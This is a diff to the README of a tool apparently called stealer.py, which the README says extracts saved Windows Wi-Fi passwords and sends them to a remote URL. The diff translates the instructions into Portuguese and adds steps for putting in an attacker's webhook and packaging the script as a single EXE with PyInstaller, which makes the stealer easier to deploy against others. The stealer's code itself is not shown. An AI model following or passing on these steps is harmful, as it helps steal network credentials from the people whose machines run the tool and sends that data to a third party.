@@ -2,17 +2,22 @@
 Extract Windows Wi-Fi Passwords to a Remote URL
 
 # Install
-Before running, install the required modules:
+Instale as dependências
 
 ```
-pip install -r requirements.txt
+python -m pip install -r requirements.txt
 ```
 
 # Usage
-To use, simply replace the `url` variable with your webhook and execute the following:
+Para usar altere o parâmetro `url` para seu webhook e execute:
 
 ```
 python stealer.py
 ```
 
-If you want to be a fancy pants, you can convert this to an exe :)
+# Making an executable
+Se você quiser ser deixa melhor, você pode converter isso em um arquivo EXE :) 
+
+```
+python -m PyInstaller --onefile stealer.py
+```
